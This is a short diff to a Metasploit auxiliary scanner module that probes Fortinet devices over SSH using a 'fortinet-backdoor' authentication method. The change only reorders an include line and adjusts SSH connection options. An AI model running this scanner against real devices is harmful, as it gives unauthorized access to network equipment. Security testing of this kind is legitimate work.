@@ -5,10 +5,10 @@
 
 class MetasploitModule < Msf::Auxiliary
 
+  include Msf::Exploit::Remote::SSH
   include Msf::Exploit::Remote::Fortinet
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
-  include Msf::Exploit::Remote::SSH
 
   def initialize(info = {})
     super(update_info(info,
@@ -43,11 +43,14 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     factory = ssh_socket_factory
+
     ssh_opts = {
-      port:         rport,
-      auth_methods: ['fortinet-backdoor'],
-      proxy: factory,
-      :non_interactive => true
+      port:            rport,
+      auth_methods:    ['fortinet-backdoor'],
+      non_interactive: true,
+      config:          false,
+      use_agent:       false,
+      proxy:           factory
     }
 
     ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
